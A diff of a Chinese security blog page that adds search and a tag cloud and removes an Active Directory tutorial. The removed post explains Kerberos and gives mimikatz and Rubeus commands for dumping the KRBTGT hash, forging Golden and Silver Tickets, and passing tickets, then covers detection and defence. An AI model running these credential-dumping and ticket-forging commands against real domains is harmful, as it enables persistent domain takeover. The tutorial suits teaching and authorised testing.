@@ -17,7 +17,7 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
 
     <meta name="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
 <meta property="og:type" content="website">
@@ -51,7 +51,9 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
 <script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
 
-  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
 
   <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
   <script src="/js/third-party/tags/mermaid.js" defer></script>
@@ -97,6 +99,7 @@
 
   <div class="site-nav-right">
     <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
     </div>
   </div>
 </div>
@@ -105,11 +108,37 @@
 
 <nav class="site-nav">
   <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
   </ul>
 </nav>
 
 
 
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
 
 </header>
         
@@ -150,8 +179,9 @@
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
+          <a href="/tags/">
         <span class="site-state-item-count">18</span>
-        <span class="site-state-item-name">标签</span>
+        <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
 </div>
@@ -163,6 +193,37 @@
         <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
       </span>
   </div>
+<div class="sidebar-tags">
+  <div class="sidebar-title">标签</div>
+  <div class="tag-cloud">
+    <a href="/tags/Web安全/" style="font-size: 1.4em; color: #e74c3c;">Web安全</a>
+    <a href="/tags/渗透测试/" style="font-size: 1.6em; color: #e74c3c;">渗透测试</a>
+    <a href="/tags/框架安全/" style="font-size: 1.2em;">框架安全</a>
+    <a href="/tags/内网渗透/" style="font-size: 1.1em;">内网渗透</a>
+    <a href="/tags/权限提升/" style="font-size: 1.1em;">权限提升</a>
+    <a href="/tags/云安全/" style="font-size: 1em;">云安全</a>
+    <a href="/tags/工具/" style="font-size: 1em;">工具</a>
+    <a href="/tags/靶场/" style="font-size: 1em;">靶场</a>
+    <a href="/tags/反序列化/" style="font-size: 0.95em;">反序列化</a>
+    <a href="/tags/移动安全/" style="font-size: 0.9em;">移动安全</a>
+    <a href="/tags/代码审计/" style="font-size: 0.9em;">代码审计</a>
+    <a href="/tags/数据库安全/" style="font-size: 0.85em;">数据库安全</a>
+    <a href="/tags/后渗透/" style="font-size: 0.85em;">后渗透</a>
+    <a href="/tags/密码学/" style="font-size: 0.8em;">密码学</a>
+    <a href="/tags/认证安全/" style="font-size: 0.8em;">认证安全</a>
+    <a href="/tags/信息收集/" style="font-size: 0.75em;">信息收集</a>
+    <a href="/tags/方法论/" style="font-size: 0.75em;">方法论</a>
+    <a href="/tags/安全运维/" style="font-size: 0.75em;">安全运维</a>
+  </div>
+</div>
+
+<style>
+.sidebar-tags { margin-top: 20px; padding: 0 15px; }
+.sidebar-tags .sidebar-title { font-size: 1.1em; font-weight: bold; margin-bottom: 10px; color: #555; }
+.sidebar-tags .tag-cloud { line-height: 2; }
+.sidebar-tags .tag-cloud a { display: inline-block; margin: 0 8px 4px 0; padding: 2px 8px; border-radius: 3px; background: #f5f5f5; text-decoration: none; border-bottom: none; }
+.sidebar-tags .tag-cloud a:hover { background: #e74c3c; color: #fff !important; }
+</style>
 
         </div>
       </div>
@@ -220,7 +281,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -312,7 +373,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -404,7 +465,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -496,7 +557,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:43" itemprop="dateModified" datetime="2026-06-05T00:11:43+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -588,7 +649,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:12:36" itemprop="dateModified" datetime="2026-06-05T00:12:36+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -680,7 +741,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -702,312 +763,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在Windows域环境中，Kerberos是默认的身份认证协议。理解Kerberos的工作原理不仅是域渗透的基础，更是掌握Golden Ticket和Silver Ticket等高级攻击技术的前提。本文将从Kerberos认证流程出发，剖析票据伪造的原理、实战及防御策略。</p>
-<p><strong>免责声明：本文所有内容仅用于安全研究和授权测试，未经授权对他人系统进行攻击属违法行为。</strong></p>
-<hr>
-<h2 id="一、Kerberos认证协议详解"><a href="#一、Kerberos认证协议详解" class="headerlink" title="一、Kerberos认证协议详解"></a>一、Kerberos认证协议详解</h2><h3 id="1-1-协议角色"><a href="#1-1-协议角色" class="headerlink" title="1.1 协议角色"></a>1.1 协议角色</h3><ul>
-<li><strong>客户端（Client）</strong>：请求访问服务的用户或机器</li>
-<li><strong>KDC（Key Distribution Center）</strong>：密钥分发中心，运行在域控上，由AS和TGS两个服务组成</li>
-<li><strong>应用服务器（AP）</strong>：提供具体服务的服务器</li>
-</ul>
-<p>description: Kerberos 票据攻击——Golden Ticket&#x2F;Silver Ticket 伪造与 mimikatz 票据传递。</p>
-<h3 id="1-2-认证流程"><a href="#1-2-认证流程" class="headerlink" title="1.2 认证流程"></a>1.2 认证流程</h3><p>整个Kerberos认证分为三个阶段、六个步骤：</p>
-<pre class="mermaid">sequenceDiagram
-    participant C as 客户端
-    participant KDC as KDC (AS + TGS)
-    participant S as 应用服务器
-
-    Note over C,KDC: 阶段一：AS Exchange
-    C->>KDC: ① AS-REQ (用户名, 用NTLM哈希加密的时间戳)
-    KDC->>C: ② AS-REP (TGT, 用用户哈希加密的Session Key)
-
-    Note over C,KDC: 阶段二：TGS Exchange
-    C->>KDC: ③ TGS-REQ (TGT + 认证符 + 目标SPN)
-    KDC->>C: ④ TGS-REP (Service Ticket, Session Key加密的Service Session Key)
-
-    Note over C,S: 阶段三：AP Exchange
-    C->>S: ⑤ AP-REQ (Service Ticket + 认证符)
-    S->>C: ⑥ AP-REP (可选, 双向认证)</pre>
-
-<p><strong>阶段一：AS Exchange（获取TGT）</strong></p>
-<ol>
-<li><strong>AS-REQ</strong>：客户端使用自身NTLM哈希加密当前时间戳作为预认证信息（PA-ENC-TIMESTAMP），随用户名发送给KDC。</li>
-<li><strong>AS-REP</strong>：AS查询用户哈希解密预认证数据并验证。通过后生成Session Key（用用户哈希加密返回），同时签发TGT。TGT使用KRBTGT账户的NTLM哈希加密，内含用户的PAC（Privilege Attribute Certificate），记录了用户SID、组关系等。</li>
-</ol>
-<p><strong>阶段二：TGS Exchange（获取ST）</strong></p>
-<ol start="3">
-<li><strong>TGS-REQ</strong>：客户端用Session Key加密认证符（Authenticator，含用户名和时间戳），连同TGT和目标服务SPN发送给TGS。</li>
-<li><strong>TGS-REP</strong>：TGS用KRBTGT哈希解密TGT取出Session Key，解密认证符并验证。通过后生成Service Session Key和Service Ticket（ST）。ST使用目标服务账户的NTLM哈希加密，内含Service Session Key和用户PAC副本。</li>
-</ol>
-<p><strong>阶段三：AP Exchange（使用ST访问服务）</strong></p>
-<ol start="5">
-<li><strong>AP-REQ</strong>：客户端用Service Session Key加密新认证符，连同ST发送给应用服务器。</li>
-<li><strong>AP-REP</strong>：服务器用自身哈希解密ST取得Service Session Key，再解密认证符完成验证。可选返回AP-REP实现双向认证。</li>
-</ol>
-<h3 id="1-3-加密密钥汇总"><a href="#1-3-加密密钥汇总" class="headerlink" title="1.3 加密密钥汇总"></a>1.3 加密密钥汇总</h3><table>
-<thead>
-<tr>
-<th>票据类型</th>
-<th>加密密钥</th>
-<th>持有者</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>TGT</td>
-<td>KRBTGT账户NTLM哈希</td>
-<td>KDC</td>
-</tr>
-<tr>
-<td>TGT中的Session Key</td>
-<td>用户NTLM哈希</td>
-<td>客户端</td>
-</tr>
-<tr>
-<td>Service Ticket (ST)</td>
-<td>目标服务账户NTLM哈希</td>
-<td>目标服务</td>
-</tr>
-<tr>
-<td>ST中的Service Session Key</td>
-<td>Session Key (来自TGT)</td>
-<td>客户端</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="二、Golden-Ticket（黄金票据）"><a href="#二、Golden-Ticket（黄金票据）" class="headerlink" title="二、Golden Ticket（黄金票据）"></a>二、Golden Ticket（黄金票据）</h2><h3 id="2-1-攻击原理"><a href="#2-1-攻击原理" class="headerlink" title="2.1 攻击原理"></a>2.1 攻击原理</h3><p>Golden Ticket攻击<strong>伪造TGT</strong>。TGT使用KRBTGT账户的NTLM哈希加密，一旦攻击者获取该哈希，便可伪造任意用户（含域管理员）的TGT，访问域内任何资源。</p>
-<p>KRBTGT账户特点：</p>
-<ul>
-<li>每个域唯一，默认创建且禁用</li>
-<li>其哈希用于加密所有TGT</li>
-<li>密码仅在DC提升时设置，极少被修改</li>
-<li>泄露后可维持持久的域访问权限</li>
-</ul>
-<h3 id="2-2-利用条件"><a href="#2-2-利用条件" class="headerlink" title="2.2 利用条件"></a>2.2 利用条件</h3><ul>
-<li>域管理员权限（以导出KRBTGT哈希）</li>
-<li>域SID（Security Identifier）</li>
-<li>域名</li>
-</ul>
-<h3 id="2-3-Mimikatz实战"><a href="#2-3-Mimikatz实战" class="headerlink" title="2.3 Mimikatz实战"></a>2.3 Mimikatz实战</h3><p>在域控上导出KRBTGT哈希：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;lsadump::lsa /patch&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
-
-<p>输出关键信息示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Domain: CORP.LOCAL</span><br><span class="line">Domain SID: S-1-5-21-123456789-1234567890-123456789</span><br><span class="line">KRBTGT NTLM: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6</span><br></pre></td></tr></table></figure>
-
-<p>构造并注入Golden Ticket：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 清理现有票据</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;kerberos::purge&quot;</span> <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成并导入Golden Ticket</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;kerberos::golden /domain:CORP.LOCAL /sid:S-1-5-21-123456789-1234567890-123456789 /krbtgt:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 /user:Administrator /id:500 /groups:512,513,518,519,520 /ptt&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
-
-<p>参数说明：</p>
-<ul>
-<li><code>/domain</code>：域名</li>
-<li><code>/sid</code>：域的SID</li>
-<li><code>/krbtgt</code>：KRBTGT账户NTLM哈希</li>
-<li><code>/user</code>：要伪造的用户名</li>
-<li><code>/id</code>：用户RID（500&#x3D;内置管理员）</li>
-<li><code>/groups</code>：组RID（512&#x3D;Domain Admins, 519&#x3D;Enterprise Admins等）</li>
-<li><code>/ptt</code>：Pass-The-Ticket，直接注入当前会话</li>
-</ul>
-<p>验证成功后即可访问域内任意资源：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\DC01.CORP.LOCAL\C<span class="variable">$</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="三、Silver-Ticket（白银票据）"><a href="#三、Silver-Ticket（白银票据）" class="headerlink" title="三、Silver Ticket（白银票据）"></a>三、Silver Ticket（白银票据）</h2><h3 id="3-1-攻击原理"><a href="#3-1-攻击原理" class="headerlink" title="3.1 攻击原理"></a>3.1 攻击原理</h3><p>Silver Ticket<strong>伪造Service Ticket（ST）</strong>。与Golden Ticket不同，它利用目标服务账户NTLM哈希直接伪造ST，不涉及KDC交互。优势：</p>
-<ul>
-<li>无需与KDC通信，更隐蔽</li>
-<li>仅需服务账户哈希，不要求域管理员权限</li>
-<li>针对性强，可精确控制访问范围</li>
-</ul>
-<h3 id="3-2-利用条件"><a href="#3-2-利用条件" class="headerlink" title="3.2 利用条件"></a>3.2 利用条件</h3><ul>
-<li>目标服务账户NTLM哈希（可通过Kerberoasting、LSASS dump、NTDS.dit提取）</li>
-<li>域SID和域名</li>
-</ul>
-<h3 id="3-3-Mimikatz实战"><a href="#3-3-Mimikatz实战" class="headerlink" title="3.3 Mimikatz实战"></a>3.3 Mimikatz实战</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 伪造针对DC的CIFS服务票据</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;kerberos::golden /domain:CORP.LOCAL /sid:S-1-5-21-123456789-1234567890-123456789 /target:DC01.CORP.LOCAL /service:cifs /rc4:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 /user:Administrator /id:500 /ptt&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
-
-<p>与Golden Ticket的关键区别：使用<code>/rc4</code>指定服务账户哈希，<code>/target</code>指定目标服务器，<code>/service</code>指定目标服务类别。</p>
-<p>常见可伪造服务类别：</p>
-<table>
-<thead>
-<tr>
-<th>服务名</th>
-<th>攻击用途</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>HOST</td>
-<td>远程管理（计划任务、WMI）</td>
-</tr>
-<tr>
-<td>CIFS</td>
-<td>文件共享访问</td>
-</tr>
-<tr>
-<td>HTTP</td>
-<td>Web服务访问</td>
-</tr>
-<tr>
-<td>LDAP</td>
-<td>目录服务操作</td>
-</tr>
-<tr>
-<td>MSSQLSvc</td>
-<td>SQL Server访问</td>
-</tr>
-</tbody></table>
-<h3 id="3-4-对比总结"><a href="#3-4-对比总结" class="headerlink" title="3.4 对比总结"></a>3.4 对比总结</h3><table>
-<thead>
-<tr>
-<th>维度</th>
-<th>Golden Ticket</th>
-<th>Silver Ticket</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>伪造对象</td>
-<td>TGT</td>
-<td>Service Ticket</td>
-</tr>
-<tr>
-<td>所需密钥</td>
-<td>KRBTGT哈希</td>
-<td>服务账户哈希</td>
-</tr>
-<tr>
-<td>权限要求</td>
-<td>域管理员</td>
-<td>仅需服务账户哈希</td>
-</tr>
-<tr>
-<td>访问范围</td>
-<td>全域</td>
-<td>仅限目标服务</td>
-</tr>
-<tr>
-<td>KDC通信</td>
-<td>首次访问时</td>
-<td>不需要</td>
-</tr>
-<tr>
-<td>隐蔽性</td>
-<td>较低（产生日志）</td>
-<td>较高（无TGS-REQ日志）</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="四、票据生命周期管理"><a href="#四、票据生命周期管理" class="headerlink" title="四、票据生命周期管理"></a>四、票据生命周期管理</h2><h3 id="4-1-默认有效期"><a href="#4-1-默认有效期" class="headerlink" title="4.1 默认有效期"></a>4.1 默认有效期</h3><ul>
-<li><strong>TGT</strong>：默认10小时，可续订最长7天</li>
-<li><strong>ST</strong>：默认10小时</li>
-<li><strong>伪造票据</strong>：有效期由攻击者自定义，不受域策略约束</li>
-</ul>
-<h3 id="4-2-自定义有效期"><a href="#4-2-自定义有效期" class="headerlink" title="4.2 自定义有效期"></a>4.2 自定义有效期</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成有效期为10年的Golden Ticket</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;kerberos::golden /domain:CORP.LOCAL /sid:S-1-5-21-... /krbtgt:hash /user:Administrator /id:500 /endin:87600 /renewmax:87600 /ptt&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
-
-<p>参数：<code>/endin</code>票据有效期（分钟），<code>/renewmax</code>续订最大期限，<code>/startoffset</code>生效时间偏移（可用于回溯）。</p>
-<p>域策略路径：<code>计算机配置 → Windows设置 → 安全设置 → 账户策略 → Kerberos策略</code>。但伪造票据不受这些策略限制。</p>
-<hr>
-<h2 id="五、Pass-The-Ticket（票据传递）"><a href="#五、Pass-The-Ticket（票据传递）" class="headerlink" title="五、Pass-The-Ticket（票据传递）"></a>五、Pass-The-Ticket（票据传递）</h2><h3 id="5-1-攻击原理"><a href="#5-1-攻击原理" class="headerlink" title="5.1 攻击原理"></a>5.1 攻击原理</h3><p>PTT将Kerberos票据注入当前会话，使会话拥有票据指定的身份，无需知道用户密码，只需有效或伪造的票据。</p>
-<h3 id="5-2-票据导出与导入"><a href="#5-2-票据导出与导入" class="headerlink" title="5.2 票据导出与导入"></a>5.2 票据导出与导入</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导出所有票据（.kirbi文件）</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::tickets /export&quot;</span> <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入票据</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;kerberos::ptt ticket.kirbi&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="5-3-Rubeus操作"><a href="#5-3-Rubeus操作" class="headerlink" title="5.3 Rubeus操作"></a>5.3 Rubeus操作</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 实时监视票据</span></span><br><span class="line">Rubeus.exe monitor /interval:<span class="number">5</span> /nowrap</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从内存转储票据</span></span><br><span class="line">Rubeus.exe dump /nowrap</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入Base64票据</span></span><br><span class="line">Rubeus.exe ptt /ticket:doIF...&lt;base64&gt;...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用哈希请求TGT</span></span><br><span class="line">Rubeus.exe asktgt /user:Administrator /rc4:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 /nowrap</span><br></pre></td></tr></table></figure>
-
-<h3 id="5-4-票据管理命令"><a href="#5-4-票据管理命令" class="headerlink" title="5.4 票据管理命令"></a>5.4 票据管理命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">klist                          <span class="comment"># 列出当前票据</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;kerberos::list&quot;</span> <span class="keyword">exit</span>  <span class="comment"># Mimikatz查看</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;kerberos::purge&quot;</span> <span class="keyword">exit</span> <span class="comment"># 清理所有票据</span></span><br><span class="line">klist purge                    <span class="comment"># 系统命令清理</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="六、检测与防御"><a href="#六、检测与防御" class="headerlink" title="六、检测与防御"></a>六、检测与防御</h2><h3 id="6-1-Windows事件日志检测"><a href="#6-1-Windows事件日志检测" class="headerlink" title="6.1 Windows事件日志检测"></a>6.1 Windows事件日志检测</h3><table>
-<thead>
-<tr>
-<th>事件ID</th>
-<th>描述</th>
-<th>检测意义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>4768</td>
-<td>TGT请求</td>
-<td>异常加密类型、非工作时间请求</td>
-</tr>
-<tr>
-<td>4769</td>
-<td>服务票据请求</td>
-<td>异常SPN请求、大量不同SPN</td>
-</tr>
-<tr>
-<td>4770</td>
-<td>TGT续订</td>
-<td>超长续订期指示Golden Ticket</td>
-</tr>
-<tr>
-<td>4771</td>
-<td>预认证失败</td>
-<td>暴力破解或AS-REP Roasting</td>
-</tr>
-<tr>
-<td>4624</td>
-<td>登录成功</td>
-<td>检查认证包和登录类型</td>
-</tr>
-<tr>
-<td>4672</td>
-<td>特权限赋予</td>
-<td>敏感组成员登录</td>
-</tr>
-</tbody></table>
-<p><strong>Golden Ticket检测特征</strong>：</p>
-<ul>
-<li>TGT有效期远超域策略（&gt;10小时）</li>
-<li>域控上4769事件缺少对应4768事件</li>
-<li>异常加密类型（如使用RC4而环境强制AES）</li>
-<li>PAC签名异常</li>
-</ul>
-<p><strong>Silver Ticket检测特征</strong>：</p>
-<ul>
-<li>缺少对应TGS-REQ事件（4769），票据是直接伪造的</li>
-<li>源IP异常，与正常Kerberos认证流不一致</li>
-<li>Service Ticket中PAC可能被篡改或缺失</li>
-</ul>
-<h3 id="6-2-防御策略"><a href="#6-2-防御策略" class="headerlink" title="6.2 防御策略"></a>6.2 防御策略</h3><p><strong>1. 保护KRBTGT账户</strong></p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重新生成KRBTGT密钥（需两次重置，间隔至少10小时）</span></span><br><span class="line">.\<span class="built_in">New-KrbtgtKeys</span>.ps1 <span class="literal">-ResetKrbtgtPassword</span></span><br></pre></td></tr></table></figure>
-
-<p>两次重置确保所有旧TGT失效，间隔需大于默认TGT有效期（10小时），避免影响正常业务。</p>
-<p><strong>2. 最小化特权</strong></p>
-<ul>
-<li>严控域管理员组成员</li>
-<li>服务账户使用Managed Service Account（MSA&#x2F;gMSA）自动轮换密码</li>
-<li>限制可委派的服务账户</li>
-</ul>
-<p><strong>3. 技术加固</strong></p>
-<ul>
-<li>禁用RC4加密，强制使用AES：组策略 → 安全选项 → <code>网络安全: 配置Kerberos允许的加密类型</code></li>
-<li>部署Credential Guard保护LSASS进程</li>
-<li>启用LSA保护（RunAsPPL）</li>
-<li>将高权限用户加入Protected Users组（使用不可缓存的凭据）</li>
-<li>定期轮换服务账户密码</li>
-</ul>
-<p><strong>4. 审计与监控</strong></p>
-<ul>
-<li>SIEM收集分析域控日志，设置异常告警</li>
-<li>监控KRBTGT密码最后修改时间</li>
-<li>定期检查敏感组成员变更</li>
-<li>部署Microsoft Defender for Identity (MDI)检测可疑票据使用</li>
-</ul>
-<h3 id="6-3-应急响应"><a href="#6-3-应急响应" class="headerlink" title="6.3 应急响应"></a>6.3 应急响应</h3><ol>
-<li>确认受影响系统范围</li>
-<li>重置KRBTGT密码两次</li>
-<li>重置受影响用户和服务账户密码</li>
-<li>清除持久化机制</li>
-<li>保留取证日志</li>
